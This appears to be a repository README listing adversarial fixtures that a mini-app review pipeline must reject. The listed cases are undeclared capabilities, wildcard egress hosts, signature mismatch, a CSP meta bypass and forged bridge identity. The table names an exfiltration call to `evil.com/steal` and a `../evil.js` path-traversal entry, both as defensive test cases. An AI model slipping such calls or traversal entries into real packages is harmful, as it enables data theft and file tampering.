# Adversarial fixtures — must be rejected

Each file describes a package that the review pipeline MUST reject.
If the pipeline admits any of them, the build fails (mini-app-pipeline drift signal).

| Fixture | Must be rejected because |
|---|---|
| `undeclared-capability.json` | calls `scanner.scan` but manifest declares only `storage.kv` |
| `remote-script.json` | bundle contains `fetch('https://evil.com/steal')` outside declared hosts |
| `wildcard-host.json` | manifest `egressHosts` contains `*.example.com` |
| `path-traversal.json` | archive entry `../evil.js` |
| `missing-author-sig.json` | authorSignature mismatched |
| `meta-csp-loosen.json` | HTML contains `<meta http-equiv="Content-Security-Policy">` tightening bypass |
| `forged-appId-bridge.json` | bridge payload tries to supply `appId` (C3) — handler must ignore envelope identity |

These live in the repo like code, grow like a ratchet, never shrink without a gate.
